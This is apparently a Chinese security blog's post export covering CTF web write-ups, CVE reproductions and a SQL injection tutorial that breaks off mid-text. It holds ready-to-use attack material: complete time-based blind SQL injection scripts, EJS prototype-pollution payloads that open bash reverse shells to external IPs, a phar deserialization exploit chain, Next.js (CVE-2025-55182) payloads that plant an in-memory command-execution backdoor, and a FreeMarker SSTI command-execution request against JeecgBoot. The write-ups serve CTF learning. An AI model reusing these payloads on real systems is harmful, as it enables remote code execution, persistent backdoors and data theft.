{"posts":[{"title":"","text":"Dest0g3 520-web ezip–就是文件上传提权010打开涩图发现后面又base64 1234567891011121314151617181920dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpcy0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIGZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=#upload.php:&lt;?phperror_reporting(0);include(&quot;zip.php&quot;);if(isset($_FILES['file']['name'])){ if(strstr($_FILES['file']['name'],&quot;..&quot;)||strstr($_FILES['file']['name'],&quot;/&quot;)){ echo &quot;hacker!!&quot;; exit; } if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)!=&quot;zip&quot;){ echo &quot;only zip!!&quot;; exit; } $Myzip = new zip($_FILES['file']['name']); mkdir($Myzip-&gt;path); move_uploaded_file($_FILES['file']['tmp_name'], './'.$Myzip-&gt;path.'/' . $_FILES['file']['name']); echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;; if($Myzip-&gt;unzip()){echo &quot;Success&quot;;}else{echo &quot;failed&quot;;}} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#zip.php:&lt;?phpclass zip{ public $zip_name; public $path; public $zip_manager; public function __construct($zip_name){ $this-&gt;zip_manager = new ZipArchive(); $this-&gt;path = $this-&gt;gen_path(); $this-&gt;zip_name = $zip_name; } public function gen_path(){ $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; $newchars=str_split($chars); shuffle($newchars); $chars_key=array_rand($newchars,15); $fnstr = &quot;&quot;; for($i=0;$i&lt;15;$i++){ $fnstr.=$newchars[$chars_key[$i]]; } return md5($fnstr.time().microtime()*100000); } public function deldir($dir) { //先删除目录下的文件： $dh = opendir($dir); while ($file = readdir($dh)) { if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) { $fullpath = $dir.&quot;/&quot;.$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { $this-&gt;deldir($fullpath); } } } closedir($dh); } function dir_list($directory) { $array = []; $dir = dir($directory); while ($file = $dir-&gt;read()) { if ($file !== '.' &amp;&amp; $file !== '..') { $array[] = $file; } } return $array; } public function unzip() { $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name; $white_list = ['jpg','png','gif','bmp']; $this-&gt;zip_manager-&gt;open($fullpath); for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) { if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;)){ echo &quot;you bad bad&quot;; return false; } } if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path)){ echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;; exit; } @unlink($fullpath); $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;); for($i=0;$i&lt;sizeof($file_list);$i++){ if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i])){ echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]); } else{ if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) {echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);} } } return true; }} 创建一个不能解压的压缩包 这里解压失败 但是解压后部分文件后直接exit 从而绕过后续的unlink /4df1bef9d0c0ef26403ff10f6f431309/she.php 发现权限不够，于是提权 1find / -user root -perm -4000 -print 2&gt;/dev/null nl有可读权限 1nl /f* phpdest123456&lt;?php highlight_file(__FILE__); require_once 'flag.php'; if(isset($_GET['file'])) { require_once($_GET['file']); } 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php ​ easysql跑脚本即可 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl=&quot;http://32a96c02-6636-425a-b16a-047c7164e64d.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; for i in range(1,100): mid=32 while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res)if __name__==&quot;__main__&quot;: SQL_injection() Really Easy SQL先试一下有没有过滤 发现输入什么都是报错 直接时间盲注吧 1234567891011121314151617181920212223242526272829import requestsimport timeurl=&quot;http://a521de12-f1b9-42f6-b179-2f488565741b.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; # 外层循环：遍历字符位置（1到99，假设flag长度不超过99） for i in range(4,100): mid=32 # 内层循环：遍历当前位置的可能ASCII码（32-127，覆盖所有可见字符） while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res) if __name__==&quot;__main__&quot;: SQL_injection() 服务器一直卡爆换for循环参数注入 1flag{790b46b0-7256-4c78-96be-2f2d043c3132} NodeSoEasy 用的ejs模板 /目录下存在原型链污染 eJS RCE 1{&quot;__proto__&quot;:{&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&gt;&amp;1\\&quot;');&quot;,&quot;compileDebug&quot;:true}} 发包用application/json 参考：https://www.anquanke.com/post/id/236354 BUU弹不了shell 暂时没招解决 1234567891011121314POST / HTTP/1.1Host: 9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh,zh-CN;q=0.9Connection: keep-aliveReferer: http://9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81/Content-Type: application/jsonContent-Length: 145{&quot;__proto__&quot;:{&quot;client&quot;:{},&quot;escapeFunction&quot;:&quot;1; require('child_process').exec('bash -i &gt;&amp; /dev/tcp/10.88.15.15/1337 0&gt;&amp;1');&quot;,&quot;compileDebug&quot;:true}} PharPOP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phphighlight_file(__FILE__);function waf($data){ if (is_array($data)){ die(&quot;Cannot transfer arrays&quot;); } // i表示大小写不敏感 if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) { die(&quot;You can't do&quot;); }}class air{ public $p; public function __set($p, $value) { $p = $this-&gt;p-&gt;act; echo new $p($value); }}class tree{ public $name; public $act; public function __destruct() { return $this-&gt;name(); } public function __call($name, $arg){ $arg[1] =$this-&gt;name-&gt;$name; }}class apple { public $xxx; public $flag; public function __get($flag) { $this-&gt;xxx-&gt;$flag = $this-&gt;flag; }}class D { public $start; public function __destruct(){ $data = $_POST[0]; if ($this-&gt;start == 'w') { waf($data); $filename = &quot;/tmp/&quot;.md5(rand()).&quot;.jpg&quot;; file_put_contents($filename, $data); echo $filename; } else if ($this-&gt;start == 'r') { waf($data); $f = file_get_contents($data); if($f){ echo &quot;It is file&quot;; } else{ echo &quot;You can look at the others&quot;; } } }}class banana { public function __get($name){ return $this-&gt;$name; }}// flag in ///入口：POST[1]长度&lt;55则反序列化if(strlen($_POST[1]) &lt; 55) { $a = unserialize($_POST[1]);}else{ echo &quot;str too long&quot;;}throw new Error(&quot;start&quot;);?&gt; 1tree._destruct-&gt;tree._call-&gt;apple._get-&gt;air._set 然后绕过throw，throw会阻碍析构函数进行，通过gc垃圾回收提前触发析构函数 绕过waf，waf过滤了很多关键字，使用gzip命令处理phar文件 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass air{ public $p;} class tree{ public $name; public $act;} class apple { public $xxx; public $flag;} $a = new tree;$b = new apple;$c = new air;$d = new tree;// $d-&gt;act='FilesystemIterator';// $c-&gt;p = $d;// $b-&gt;xxx = $c;// $b-&gt;flag = 'glob:///*f*';// $a-&gt;name = $b;$d-&gt;act='SplFileObject';$c-&gt;p = $d;$b-&gt;xxx = $c;$b-&gt;flag = &quot;/fflaggg&quot;;$a-&gt;name = $b; $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件,随便新建一个文件内容随意$phar-&gt;stopBuffering(); 生成的phar文件在010editor中打开，删去最后一个} 修改签名并压缩phar文件 123456from hashlib import sha1f = open('phar.phar', 'rb').read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen('fixed_phar.phar', 'wb').write(newf) # 写入新文件 运行项目并下载源码 以url编码形式输出文件内容 123456import urllib.parse with open(&quot;fixed_phar.phar.gz&quot;, 'rb') as fi: f = fi.read() ff = urllib.parse.quote(f) #获取信息 print(ff) 运行项目并下载源码 写入phar文件 10=%1F%8B%08%08%7C%22%1Df%00%03fixed_phar.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C8%C0%C0%C0%08%C4%82P%9A%81a5%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%042%83%0Br%DC2sR%FD%93%B2RA%82%B5%B5%60%D5i9%89%E9%20%15%16VJ%FAi%20N%3A%90%5B%8B%D0%EBg%CD%01tmIjq%89%5EIE%09%0B%C8%F9%8A%B2i%20%9A%A7%AE%FE%C66%88%87%C0%F2%CBO%CC%FE%BAh%E5%FC%1B%B2%AD%C9%1A%B7.8%19O%EC9%26%C9%04%94sw%F2u%02%00%15%9D%B7%24%27%01%00%00&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;w&quot;;} 运行项目并下载源码 phar协议读文件操作触发phar反序列化拿flag 10=phar:///tmp/96c72754133e4a4d55d0baee6bfdb66a.jpg&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;r&quot;;} 运行项目并下载源码","link":"/2025/12/11/Dest0g3%20520-web/"},{"title":"","text":"hexstrike-ai kali作为服务端，Windows作为客户端kali的IP：192.168.1.101 启动hexstrlike-ai 12345cd /home/challenge/Desktop/hexstrike-aisource venv/bin/activatepython3 hexstrike_server.py 客户端启动 1python hexstrike_mcp.py --server http://192.168.1.101:8888 --debug trae的mcp配置文件 123456789101112131415{ &quot;mcpServers&quot;: { &quot;hexstrike-ai&quot;: { &quot;command&quot;: &quot;D:\\\\env\\\\Python\\\\Python313\\\\python.exe&quot;, &quot;args&quot;: [ &quot;D:\\\\hexstrike-ai\\\\hexstrike_mcp.py&quot;, &quot;--server&quot;, &quot;http://192.168.1.101:8888&quot; ], &quot;description&quot;: &quot;HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform&quot;, &quot;timeout&quot;: 300, &quot;disabled&quot;: false } }} MCP调试工具启动，这个默认启动最新版本 1npx @modelcontextprotocol/inspector 点链接进入浏览器 如下所示 Command 1D:\\env\\Python\\Python313\\python.exe Arguments 1D:\\\\hexstrike-ai\\\\hexstrike_mcp.py --server http://192.168.1.101:8888 然后就可以用这个页面去微调MCP了像一些什么提示词之类的","link":"/2025/12/11/hexstrlike-ai/"},{"title":"","text":"js内存马-CVE-2025-55182 版本1不知道是太长了还是什么原因 1234567891011121314{ &quot;then&quot;: &quot;$1:__proto__:then&quot;, &quot;status&quot;: &quot;resolved_model&quot;, &quot;reason&quot;: -1, &quot;value&quot;: &quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;, &quot;_response&quot;: { &quot;_prefix&quot;: &quot;(async()=&gt;{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/deep'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=&gt;{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();&quot;, &quot;_chunks&quot;: &quot;$Q2&quot;, &quot;_formData&quot;: { &quot;get&quot;: &quot;$1:constructor:constructor&quot; } }}{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}} CVE-2025-55182 春秋云镜复现 123456789101112131415161718POST /apps HTTP/2Host: eci-2zeiverm334jp4jylqln.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0Accept-Encoding: gzip, deflateNext-Action: xX-Nextjs-Request-Id: test123Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryContent-Length: 594------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;0&quot;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}}------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;1&quot;&quot;$@0&quot;------WebKitFormBoundary-- 访问获取flag 1/deep?cmd=cd%20../../;cat%20/flag","link":"/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"},{"title":"","text":"JeecgBoot jmreport/loadTableData 接口 SSTI 漏洞–CVE-2023-41544 1234567891011POST /jmreport/queryFieldBySql HTTP/1.1Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Content-Length: 95Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/json{&quot;sql&quot;:&quot;select '&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; ${ ex(\\&quot;pwd\\&quot;) }' &quot;} 漏洞原理12345678910111213141516171819//传参String userInputSql = request.getParam(&quot;sql&quot;); //初始化FreeMarker配置Configuration freeMarkerCfg = new Configuration(Configuration.VERSION_2_3_31);//默认配置未禁用危险类解析// freeMarkerCfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);//输入的sql作为FreeMarker模板内容Template template = new Template( &quot;sqlTemplate&quot;, new StringReader(userInputSql), //用户输入的sql直接作为模板内容 freeMarkerCfg);//渲染模板（输入的sql中的FreeMarker指令被执行）String renderedContent = FreeMarkerTemplateUtils.processTemplateIntoString(template, null);executeSql(renderedContent); 实例化Execute类，得到可执行命令的ex对象 执行${ex(&quot;ls&quot;)}：调用ex执行ls命令，获取服务器上ls的执行结果","link":"/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/"},{"title":"","text":"sql注入全 1.什么是注入？注入就是通过SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终到达服务器执行恶意的SQL代码，从而进一步得到相应的数据信息 构造一条精巧的语句，来查询到想要得到的信息。 2.注入有哪几种分类按照查询字段 按照注入的方式：union注入，报错注入，布尔注入，时间注入 3.什么是注入点注入点就是可以实行注入的地方，通常是一个访问数据库的连接。如本页面注入点input the ID 4.如何判断是以什么类型注入如何判断是字符型还是数字型方法一：and 1=1和and 1=2来判断 字符型数字型and 1=1和and 1=2都出现正常提示页面，则不可能是数字型注入当你是数字型的时候这个id 1=2是不能正常执行的 方法二： 1?id=2-1 字符型是不做运算的，查出来任然是2数字型是会做运算的 这里一般不用+号，+号有时候会被理解成空格 5.闭合方式是什么字符型需要闭合符，如下所示 1$scl=&quot;select * from users where id='$id' limit 0,1&quot;; 提交 1=and 1=1 1$scl=&quot;select * from users where id='1 and 1=1' limit 0,1&quot;; 里面的命令不会当成命令来执行 数字型则不需要闭合符来闭合 1$scl=&quot;select * from users where id=$id limit 0,1&quot;; 提交 and 1=2 1$scl=&quot;select * from users where id=$id and 1=2 limit 0,1&quot;; 6.如何判断闭合方式分析报错这里输入2’发现多了一个单引号报错了 7.闭合的作用是什么？手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号‘-+’或‘#或%23注释掉注释掉：利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行（而非删除掉） 8.什么是union联合注入联合查询注入 1?id=1' union select database ()--+ 上面会报错先判断前面的列数,如下语句判断 1234?id=1' group by 3 --+或者?id=1' order by 3 --+?id=1' union select 1,2,3 --+ UNION 要求前后两个查询的字段数量必须一致查询三个常量值 1,2,3只会读取第一行把它读取出来，然后把那个1修改成-1即可 1?id=-1' union select 1,2,3 --+ 1?id=-1' union select 1,version(),database() --+ 1.先查找注入点2.判断数字型还是字符型 and 1=1 1=2/ 3-13.如果是字符型，判断闭合方式 ' &quot; ') &quot;)4.判断查询列数，group by order by5.查询回显位 ?id=-1 'union select 1,2,3--+ sql前置1234cd D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\Extensions\\MySQL5.7.26\\binmysql -u root -p -P 8848//root是数据库名字 如果修改了phpstudy里的sql端口要在phpadmin如下路径下的 12D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\phpadmin\\phpMyAdmin4.8.5\\librariesconfig.default.php 然后修改成sql的端口 mysql增删改12345678910111213# 登录 MySQL（root 用户，-p 后不直接写密码更安全）mysql -u root -p# 提示输入密码时，输入正确密码后回车# 查看所有数据库（SQL 命令需以分号结尾）show databases;# 创建数据库 employees，指定字符集为 utf8（注意：utf8mb4 更推荐，支持完整 Unicode）create database employees charset utf8;# 或更推荐：create database employees charset utf8mb4;# 删除数据库 employees（危险操作，会直接删除所有数据）drop database employees; 12use employees;#使用数据库 1234567891011121314151617181920212223242526CREATE TABLE 表名 ( 字段1 数据类型 [约束条件], 字段2 数据类型 [约束条件], ...);CREATE TABLE employee ( id int, name varchar(40), sex char(4), birthday date, job varchar(100));#查看数据库信息show full columns from employee;#查看数据表列表select from employee;#删除数据表drop table employee;#修改数据表名称为userrename table employee to user;#修改字符级alter table user character set utf8; 12345678910111213insert into user(id, name, sex, birthday, job)values(1, 'ctfstu', 'male', '1999-05-06', 'it');#写入内容INSERT INTO users (id, name, sex, birthday, job)VALUES (1, 'ctfstu', 'male', '1999-05-06', 